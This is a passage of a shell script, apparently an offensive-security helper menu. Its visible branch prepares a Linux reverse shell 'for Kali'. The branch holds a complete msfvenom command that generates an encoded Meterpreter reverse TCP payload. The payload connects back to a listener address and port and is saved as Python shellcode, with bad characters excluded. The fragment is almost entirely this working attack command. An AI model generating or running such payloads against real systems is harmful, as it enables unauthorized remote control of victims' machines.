...
case "$letsgoto" in
  ...
  "2") echo "[+] preparing Linux revshell for Kali ($KALI on port $KALIPORT):"
       msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.183 LPORT=4444 EXITFUNC=thread -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" > linshell.py 2>&1
